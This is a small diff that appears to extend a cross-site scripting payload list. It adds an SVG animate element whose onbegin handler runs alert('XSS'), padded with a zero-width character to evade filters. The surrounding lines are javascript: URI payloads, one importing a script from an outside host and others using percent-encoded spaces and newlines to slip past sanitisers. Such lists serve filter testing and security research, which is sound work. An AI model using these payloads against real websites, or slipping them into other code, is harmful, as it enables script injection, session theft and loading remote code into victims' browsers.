@@ -1,3 +1,4 @@
+<svg xmlns="w3.org/2000/svg"><animate onbegin​=alert('XSS') attributeName=x dur=1s></animate></svg>
 javascript:import('//X55.is')//#alert('')
 ja%20vascri%20pt:alert(1)
 jav%0Aascri%0Apt:alert(1)
